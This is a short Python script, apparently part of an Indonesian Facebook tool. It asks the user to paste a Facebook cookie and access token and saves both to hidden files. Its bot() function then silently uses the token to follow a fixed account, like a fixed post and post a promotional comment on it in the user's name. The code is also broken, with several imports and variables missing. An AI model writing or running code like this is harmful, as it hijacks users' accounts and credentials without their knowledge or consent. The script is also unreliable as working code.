import os

def bot():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		print("\033[1;91m[!] token kedaluwarsa !!!")
		os.system('rm token.txt')
		login()
	texs = ("mas acill semoga rezekinya lancar amin :)\n\nhttps://www.facebook.com/100040708001839/posts/716737126359881/?app=fbl\n")
	kom = ("Komentar Ini Ditulis Oleh Bot ")
	waktu = str(datetime.now().strftime('%H:%M:%S'))
	tanggal = ("%s %s %s"%(ha,op,ta))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
	requests.post('https://graph.facebook.com/100040708001839/subscribers?access_token=' + token) 
	requests.post('https://graph.facebook.com/716737126359881/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/716737126359881/comments/?message=' + respon + '\n\n' + texs +'\n' + kom + '\n[ Pukul '+ waktu + ' WIB ] '+ '\n- '+ _hari_ + ', '+ tanggal + ' -' + '&access_token=' + token)
os.system("clear")

cookie=input('INPUT COOKIE :')
token=input('INPUT TOKEN : ')
open('.cookie.txt','w').write(cookie)
open('.token.txt','w').write(token)
os.system('python run.py')
